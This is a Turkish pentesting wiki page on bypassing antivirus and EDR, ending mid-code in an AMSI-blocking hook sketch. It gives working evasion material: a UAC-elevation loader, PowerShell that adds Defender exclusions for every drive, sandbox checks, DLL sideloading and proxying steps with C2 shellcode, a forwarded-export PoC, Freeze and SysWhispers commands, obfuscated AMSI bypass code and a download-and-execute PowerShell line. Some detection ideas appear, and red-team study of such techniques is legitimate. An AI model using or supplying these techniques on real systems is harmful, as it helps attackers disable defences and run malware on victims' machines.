# Antivirus (AV) Atlatma

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)** tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durduran bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durduran bir araç.
- [Yöneticiyseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce yükleyici tarzı UAC tuzağı

Oyun hilesi gibi görünen herkese açık loader'lar genellikle imzasız Node.js/Nexe yükleyicileri olarak dağıtılır ve önce **kullanıcıdan yükseltme izni ister**, ardından Defender'ı etkisiz hâle getirir. İşleyiş basittir:

1. `net session` ile yönetici bağlamını kontrol eder. Komut yalnızca çağıran yönetici haklarına sahipse başarılı olur; dolayısıyla başarısız olması loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Orijinal komut satırını korurken beklenen UAC izin istemini tetiklemek için hemen kendisini `RunAs` fiiliyle yeniden başlatır.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Kurbanlar zaten “crack’li” yazılım yüklediklerine inandığından istemi genellikle kabul eder ve böylece malware, Defender’ın ilkesini değiştirmek için ihtiyaç duyduğu hakları alır.<sup>[[26]](#references)</sup>

### Her sürücü harfi için kapsamlı `MpPreference` dışlamaları

Yetkiler yükseltildikten sonra GachiLoader tarzı zincirler, hizmeti doğrudan devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog’unu sonlandırır (`taskkill /F /IM SecHealthUI.exe`), ardından her kullanıcı profilinin, sistem dizininin ve çıkarılabilir diskin taranamaz hâle gelmesi için **son derece kapsamlı dışlamalar** ekler:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Döngü, bağlanan her dosya sistemini (D:\, E:\, USB bellekler vb.) tarar; böylece diskin herhangi bir yerine bırakılacak **gelecekteki payload'lar yok sayılır**.
- `.sys` uzantısının hariç tutulması ileriye dönük bir önlemdir: saldırganlar, Defender'a tekrar dokunmadan daha sonra imzasız sürücüler yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır. Böylece sonraki aşamalar, UAC'yi yeniden tetiklemeden dışlamaların kalıcı olduğunu doğrulayabilir veya bunları genişletebilir.

Hiçbir Defender hizmeti durdurulmadığı için basit sağlık kontrolleri, gerçek zamanlı inceleme bu yolları hiç denetlemese de “antivirüs etkin” raporlamaya devam eder.<sup>[[26]](#references)</sup>

## **AV Evasion Metodolojisi**

Günümüzde AV'ler, bir dosyanın kötü amaçlı olup olmadığını denetlemek için farklı yöntemler kullanır: statik tespit, dinamik analiz ve daha gelişmiş EDR'ler için davranışsal analiz.

### **Statik tespit**

Statik tespit; bir binary veya script içindeki bilinen kötü amaçlı dizeleri ya da bayt dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (ör. dosya açıklaması, şirket adı, dijital imzalar, simge, checksum vb.) gerçekleştirilir. Bu nedenle bilinen, herkese açık araçları kullanmak yakalanma olasılığınızı artırabilir; çünkü bu araçlar muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmiştir. Bu tür tespiti aşmanın birkaç yolu vardır:

- **Şifreleme**

Binary'yi şifrelerseniz AV'nin programınızı tespit etmesi mümkün olmaz; ancak programın şifresini çözmek ve bellekte çalıştırmak için bir tür loader gerekir.

- **Obfuscation**

Bazen AV'yi aşmak için binary veya script'inizdeki bazı dizeleri değiştirmeniz yeterlidir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu, zaman alıcı bir iş olabilir.

- **Özel araçlar**

Kendi araçlarınızı geliştirirseniz bilinen kötü amaçlı imzalar olmaz; ancak bu çok zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender'ın statik tespitini denetlemenin iyi bir yolu [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanmaktır. Araç, dosyayı birden fazla segmente böler ve Defender'dan her birini ayrı ayrı taramasını ister. Böylece binary'nizde hangi dizelerin veya baytların işaretlendiğini tam olarak gösterebilir.

Pratik AV Evasion hakkında bu [YouTube oynatma listesini](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) incelemenizi önemle tavsiye ederim.

### Statik sınıflandırıcılar için çevrimdışı PE özellik testleri

Paketlenmiş veya şifrelenmiş payload baytları, statik bir sınıflandırıcı için kullanılan girdilerden yalnızca biridir. EMBER2024; import, export, section, header ve Authenticode verileri dâhil PE özelliklerini çıkarır.<sup>[[48]](#references)</sup> Bir loader deneyinde, zararsız görünen 141 import eklemek EMBER2024'ün kötü amaçlılık puanını %93 düşürürken, malware ile ilişkili import'lar puanı yükseltti. Bu sonuç, o model ve o örnekler için geçerlidir; belirli bir AV/EDR ürününü güvenilir biçimde aşacağı anlamına gelmez.<sup>[[50]](#references)</sup>

Yetkili bir loader testi için payload'ı ve yürütme yolunu sabit tutun, her varyantta hedeflenen tek bir derleme değişkenini değiştirin ve puanları çevrimdışı karşılaştırın. Derleme değişikliği birden fazla özellik grubunu etkileyebileceğinden, ortaya çıkan PE özelliklerini inceleyin.<sup>[[49]](#references)[[50]](#references)</sup> Hedeflenen import'ları IAT'de tutmak için seçilen Win32 API'lerini erişilebilir koddan çağırın. Seçimi değiştirin ve çağrı noktalarını derlemeler arasında dağıtın; böylece imzaya dönüşebilecek sabit bir kamuflaj işlevi oluşturmayın. Deneyde ayrıca geçerli kod imzalama, export girdileri ve `.pdata` boyutunu artıran daha fazla işlevle puanların düştüğü bildirildi; geçersiz imzalamanın etkisi çok azdı ve `.pdata` etkisi küçüktü.<sup>[[50]](#references)</sup>

`thrember` paketi, özellik çıkarma ve kıyaslama modelleri sağlar. Paketi kurduktan sonra mevcut bir `models` diziniyle `thrember.download_models("models")` komutunu kullanın; ardından puanlayıcıyı bu dizinin üst dizininden çalıştırın: indirme yardımcısı geçerli çalışma dizinini değiştirir. PE sınıflandırıcısı, derlemeleri bir tarama hizmetine göndermeden bir dizini puanlayabilir:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Karşılaştırma sırasında model ve feature-extractor sürümlerini sabit tutun. Daha düşük bir çevrimdışı puan, yalnızca bu sınıflandırıcının değiştirilen binary'ye nasıl tepki verdiğini gösterir; davranışsal analizden, emülasyondan veya bir sağlayıcının farklı modelinden kaçıldığını kanıtlamaz.<sup>[[49]](#references)[[50]](#references)</sup> [Sanallaştırılmış payload'larda derleme başına polymorphism ve dış binary kamuflajı](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) için ayrı yürütme modeline bakın.

### **Dinamik analiz**

Dinamik analiz, AV'nin binary'nizi bir sandbox'ta çalıştırıp kötü amaçlı etkinlikleri izlemesidir (ör. tarayıcınızın parolalarını çözmeye ve okumaya çalışmak, LSASS üzerinde minidump almak vb.). Bu kısım üzerinde çalışmak biraz daha zor olabilir, ancak sandbox'lardan kaçınmak için yapabileceğiniz bazı şeyler şunlardır.

- **Yürütmeden önce bekleme** Uygulanma şekline bağlı olarak, AV'nin dinamik analizini atlatmak için harika bir yöntem olabilir. AV'lerin, kullanıcının iş akışını kesintiye uğratmamak için dosyaları taramak üzere çok az zamanı vardır; bu nedenle uzun süre bekletmek binary analizini aksatabilir. Sorun şu ki, birçok AV sandbox'ı uygulama şekline bağlı olarak bekleme süresini atlayabilir.
- **Makinenin kaynaklarını kontrol etme** Sandbox'larda genellikle kullanılabilecek çok az kaynak bulunur (ör. < 2 GB RAM); aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada oldukça yaratıcı da olabilirsiniz; örneğin CPU sıcaklığını, hatta fan hızını kontrol edebilirsiniz. Sandbox'ta her şey uygulanmış olmayabilir.
- **Makineye özgü kontroller** "contoso.local" etki alanına katılmış bir iş istasyonundaki kullanıcıyı hedeflemek istiyorsanız, bilgisayarın etki alanının belirttiğinizle eşleşip eşleşmediğini kontrol edebilirsiniz. Eşleşmiyorsa programınızdan çıkabilirsiniz.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı. Dolayısıyla, detonation öncesinde malware'inizde bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ile eşleşiyorsa Defender'ın sandbox'ındasınız demektir; bu durumda programınızdan çıkabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı kullanabileceğiniz, [@mgeeky](https://twitter.com/mariuszbit) tarafından paylaşılan diğer bazı çok iyi ipuçları:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu yazıda daha önce belirttiğimiz gibi, **herkese açık araçlar** er ya da geç **tespit edilir**. Bu yüzden kendinize şunu sormalısınız:

Örneğin, LSASS dökmek istiyorsanız **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS dökebilen başka bir proje kullanabilir misiniz?

Doğru yanıt muhtemelen ikincisidir. mimikatz'ı örnek alırsak, AV'ler ve EDR'ler tarafından en çok işaretlenen malware'lerden biri, hatta belki de en çok işaretlenenidir. Projenin kendisi çok iyi olsa da AV'leri aşmak için onunla çalışmak tam bir kâbustur. Bu yüzden elde etmeye çalıştığınız sonuç için alternatiflere bakın.

> [!TIP]
> Evasion amacıyla payload'larınızı değiştirirken Defender'da **otomatik örnek gönderimini kapattığınızdan** emin olun ve uzun vadede evasion elde etmek istiyorsanız lütfen, cidden, **VIRUSTOTAL'A YÜKLEMEYİN**. Payload'unuzun belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, AV'yi bir VM'ye kurun, otomatik örnek gönderimini kapatmaya çalışın ve sonuçtan memnun kalana kadar orada test edin.

## EXE'ler ve DLL'ler

Mümkün olduğunda evasion için her zaman **DLL kullanmaya öncelik verin**. Deneyimlerime göre DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir; bu nedenle payload'unuz DLL olarak çalışabiliyorsa bazı durumlarda tespitten kaçınmak için kullanabileceğiniz çok basit bir yöntemdir.

Bu görselde görebileceğiniz gibi, Havoc'un bir DLL Payload'u antiscan.me'de 4/26 tespit oranına sahipken EXE payload'unun tespit oranı 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me'de normal bir Havoc EXE payload'u ile normal bir Havoc DLL'in karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyalarıyla daha gizli olmanızı sağlayacak bazı yöntemleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, kurban uygulamayı ve kötü amaçlı payload'ları yan yana konumlandırarak loader'ın kullandığı DLL arama sırasından yararlanır.

DLL Sideloading'e açık programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e açık programların ve yüklemeye çalıştıkları DLL dosyalarının listesini verir.

**DLL Hijackable/Sideloadable programları** kendiniz keşfetmenizi şiddetle tavsiye ederim. Bu teknik doğru uygulandığında oldukça gizlidir; ancak kamuya açık olarak bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği adla kötü amaçlı bir DLL yerleştirmek payload'unuzu çalıştırmaya yetmez; çünkü program, bu DLL'nin içinde belirli işlevlerin bulunmasını bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, programın yaptığı çağrıları proxy (ve kötü amaçlı) DLL'den orijinal DLL'ye yönlendirir. Böylece programın işlevselliği korunurken payload'unuzun yürütülmesi de sağlanır.

[@flangvik](https://twitter.com/Flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Bunlar sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz ([SGN](https://github.com/EgeBalci/sgn) ile encode edilmiş) hem de proxy DLL, [antiscan.me](https://antiscan.me) üzerinde 0/26 algılama oranına sahip! Buna başarı derim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında daha fazla bilgi edinmek için [S3cur3Th1sSh1t'ın Twitch VOD'unu](https://www.twitch.tv/videos/1644171543) ve ayrıca daha önce konuştuklarımızı daha derinlemesine öğrenmek için [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) **kesinlikle** izlemenizi öneririm.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan işlevleri export edebilir: export girdisi, kodu işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII dizesi içerir. Bir çağıran export'u çözümlediğinde, Windows loader şunları yapar:

- Henüz yüklenmemişse `TargetDll`'yi yükler
- `TargetFunc`'ı içinden çözümler

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise, korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse, modülün forward çözümlemesini yapan dizini de içeren normal DLL arama sırası kullanılır.

Bu, dolaylı bir sideloading primitive'i sağlar: KnownDLL olmayan bir modül adına forward edilen bir işlevi export eden imzalı bir DLL bulun ve bu imzalı DLL ile saldırganın denetimindeki, forward edilen hedef modülle tamamen aynı adı taşıyan bir DLL'yi aynı dizine yerleştirin. Forward edilen export çağrıldığında, loader forward'ı çözümler ve DLL'nizi aynı dizinden yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen örnek:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırası kullanılarak çözümlenir.

PoC (copy-paste):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod çalıştırmak için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için yönlendirilen işlevi uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) İmzalı bir LOLBin ile forward işlemini tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Gözlemlenen davranış:
- rundll32 (imzalı), yan yana bulunan `keyiso.dll` dosyasını (imzalı) yükler
- Yükleyici `KeyIsoSetAuditingInterface` işlevini çözümlerken `NCRYPTPROV.SetAuditingInterface` yönlendirmesini izler
- Ardından yükleyici `C:\test` konumundaki `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, `DllMain` zaten çalıştıktan sonra "eksik API" hatası alırsınız

Avlanma ipuçları:
- Hedef modülün KnownDLL olmadığı yönlendirilmiş dışa aktarımlara odaklanın. KnownDLL’ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Yönlendirilmiş dışa aktarımları aşağıdaki gibi araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Tespit/savunma fikirleri:
- LOLBins'in (örn. rundll32.exe) sistem dışı yollardan imzalı DLL'ler yüklemesini ve ardından aynı dizindeki aynı temel ada sahip, KnownDLLs olmayan DLL'leri yüklemesini izleyin
- Şu tür işlem/modül zincirleri için uyarı oluşturun: `rundll32.exe` → sistem dışı `keyiso.dll` → kullanıcı tarafından yazılabilir yollardaki `NCRYPTPROV.dll`
- Kod bütünlüğü politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde yazma+çalıştırma izinlerini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış işlemler, doğrudan syscall'lar ve alternatif yürütme yöntemleri kullanarak EDR'leri atlatmaya yönelik bir payload araç setidir`

Freeze'i shellcode'unuzu gizli bir şekilde yüklemek ve çalıştırmak için kullanabilirsiniz.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion, kedi-fare oyunundan ibarettir; bugün işe yarayan bir yöntem yarın tespit edilebilir. Bu yüzden asla tek bir araca güvenmeyin ve mümkünse birden fazla evasion tekniğini zincirleme kullanmayı deneyin.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR'lar, `ntdll.dll` syscall stub'larına sıklıkla **user-mode inline hook** yerleştirir. Bu hook'ları atlatmak için doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export entrypoint'ini çalıştırmadan kernel mode'a geçiş yapan **direct** veya **indirect** syscall stub'ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Çağrı seçenekleri:**
- **Direct (embedded)**: Oluşturulan stub'a `syscall`/`sysenter`/`SVC #0` talimatı ekler (`ntdll` export'una uğramaz).
- **Indirect**: Kernel geçişinin `ntdll`'den geliyormuş gibi görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrı için bir havuzdan gadget seçer.
- **Egg-hunt**: Diske statik `0F 05` opcode dizisinin eklenmesini önler; syscall dizisini çalışma zamanında çözümler.

**Hook'a dayanıklı SSN çözümleme stratejileri:**
- **FreshyCalls (VA sort)**: Stub baytlarını okumak yerine syscall stub'larını virtual address'e göre sıralayarak SSN'leri çıkarır.
- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` eşler, `.text` içinden SSN'leri okur, ardından eşlemeyi kaldırır (bellekteki tüm hook'ları atlatır).
- **RecycledGate**: VA sıralı SSN çıkarımını, stub temiz olduğunda opcode doğrulamasıyla birleştirir; hook'lanmışsa VA çıkarımına geri döner.
- **HW Breakpoint**: `syscall` talimatı üzerine DR0 ayarlar ve hook'lanmış baytları ayrıştırmadan çalışma zamanında SSN'yi `EAX`'ten yakalamak için VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Temiz x64 `ntdll` syscall export'larını SSN için ayrıştırırken hem `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) dizisine hem de bunun önüne `F3 0F 1E FA` (`endbr64`) eklenmiş hâline izin verin. İkincisi CET önekli bir stub'dır: SSN'nin her zaman sabit bir offset'te olduğunu varsayan bir parser bunu gözden kaçırır. Indirect-syscall başlatma işlemi başarısız olur ve loader `GetProcAddress`'e geri dönerse, bu export'lar üzerinden yapılan çağrılar yeniden user-mode hook'larına takılabilir.<sup>[[54]](#references)</sup>

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"'ı önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu; bu nedenle payload'ları bir şekilde **doğrudan bellekte** çalıştırabilirseniz, yeterli görünürlüğe sahip olmadıkları için AV'ler bunu engellemek adına hiçbir şey yapamıyordu.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir:

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumunun yükseltilmesi)
- PowerShell (script'ler, etkileşimli kullanım ve dinamik kod değerlendirmesi)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA makroları

Antivirus çözümlerinin script davranışını, script içeriklerini hem şifrelenmemiş hem de gizlenmemiş biçimde sunarak incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` çalıştırıldığında, Windows Defender'da aşağıdaki uyarı oluşur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` önekini ve ardından script'in çalıştırıldığı executable'ın yolunu eklediğine dikkat edin; bu örnekte, powershell.exe

Diske hiçbir dosya bırakmadık, ancak AMSI nedeniyle yine de bellekte yakalandık.

Ayrıca **.NET 4.8** sürümünden itibaren C# kodu da AMSI üzerinden çalıştırılır. Bu, bellekte çalıştırmak için `Assembly.Load(byte[])` kullanımını da etkiler. AMSI'den kaçınmak için bellekte çalıştırma işlemlerinde daha düşük .NET sürümlerinin (ör. 4.7.2 veya altı) önerilmesinin nedeni budur.

AMSI'yi aşmanın birkaç yolu vardır:

- **Obfuscation**

AMSI temel olarak statik tespit yöntemleri kullandığından, yüklemeye çalıştığınız script'leri değiştirmek tespitten kaçınmak için iyi bir yöntem olabilir.

Ancak AMSI, birden fazla katman içerseler bile script'lerin obfuscation'ını çözebilir; bu nedenle obfuscation, nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu da tespitten kaçınmayı çok kolay olmayan bir hâle getirir. Yine de bazen birkaç değişken adını değiştirmeniz yeterli olur; bu, bir içeriğin ne ölçüde işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, PowerShell (ayrıca cscript.exe, wscript.exe vb.) sürecine bir DLL yüklenerek uygulandığı için, ayrıcalıksız bir kullanıcı olarak çalışırken bile kolayca kurcalanabilir. AMSI uygulamasındaki bu kusur nedeniyle araştırmacılar, AMSI taramasından kaçınmanın birden fazla yolunu bulmuştur.

**Hata Zorlamak**

AMSI başlatma işlemini başarısız olmaya zorlamak (`amsiInitFailed`), geçerli süreç için hiçbir taramanın başlatılmamasına neden olur. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklandı ve Microsoft, yaygın kullanımını önlemek için bir imza geliştirdi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI'yi mevcut PowerShell süreci için kullanılamaz hale getirmek tek satırlık bir PowerShell kodu gerektirdi. Elbette bu satır AMSI tarafından tespit edildiğinden, bu tekniği kullanabilmek için bazı değişiklikler yapmak gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Aklınızda bulundurun: Bu gönderi yayımlandıktan sonra muhtemelen tespit edilecektir; bu nedenle amacınız fark edilmeden kalmaksa herhangi bir kod yayımlamamalısınız.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedilmiştir. `amsi.dll` içindeki (kullanıcının sağladığı girdiyi taramaktan sorumlu) "AmsiScanBuffer" işlevinin adresini bulmayı ve bu adresin üzerine `E_INVALIDARG` kodunu döndürecek talimatlar yazmayı içerir. Böylece gerçek taramanın sonucu 0 döner ve bu, temiz sonuç olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) sayfasını okuyun.

AMSI'yi powershell ile bypass etmek için kullanılan başka birçok teknik de var. Daha fazla bilgi edinmek için [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) sayfalarına göz atın.

### `AmsiScanBuffer` patching yerine AMSI COM scan-pointer yönlendirmesi

Sürece özgü başka bir bypass, `AmsiScanBuffer` giriş noktasına dokunmaz. Bildirilen 64 bit .NET loader'da, CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` kullanılarak bir AMSI COM nesnesi oluşturulur; `Marshal.GetIUnknownForObject()` arayüz işaretçisini verir ve `0x18` ofsetindeki vtable yuvası tarama çağrısının hedefi olarak kullanılır. Loader, `Console.Clear()` için yerel bir işaretçiye küçük bir x64 stub yazar, `VirtualProtect()` altında bu vtable girdisini stub'a yönlendirir ve ardından özgün sayfa korumasını geri yükler. Hem 64 bit işaretçi genişliği hem de beklenen COM düzeni gereklidir; bu, rastgele AMSI arayüzleri veya derlemeleri için genel bir ofset değildir. Daha önce gözlemlenen aşamalar [signed AppDomainManager sidecar loading](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) ve [RESX deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml) aşamalarıdır.<sup>[[51]](#references)</sup>

Gözlemlenen stub baytları `41 C7 00 01 00 00 00 33 C0 C3` şeklindedir: `r8` içindeki sonuç işaretçisine **1** yazar ve `eax` içinde **0** döndürür. Bu nedenle tarama sonucunun `AMSI_RESULT_CLEAN` (0) olduğu yönündeki bildirilen iddia, `S_OK` dönüş değerini çıktı enum değeriyle karıştırır. Belgelenmiş `AMSI_RESULT` sıralamasında sonuç **1**, `AMSI_RESULT_NOT_DETECTED` değeridir; bu değer yine de tespit eşiğinin altındadır.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### amsi.dll yüklenmesini önleyerek AMSI'yi engelleme (LdrLoadDll hook)

AMSI, yalnızca `amsi.dll` geçerli sürece yüklendikten sonra başlatılır. Dilden bağımsız, sağlam bir bypass yöntemi, `ntdll!LdrLoadDll` üzerine kullanıcı modunda bir hook yerleştirerek istenen modül `amsi.dll` olduğunda hata döndürmektir. Böylece AMSI hiç yüklenmez ve bu süreçte hiçbir tarama gerçekleşmez.<sup>[[23]](#references)</sup>

Uygulama taslağı (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

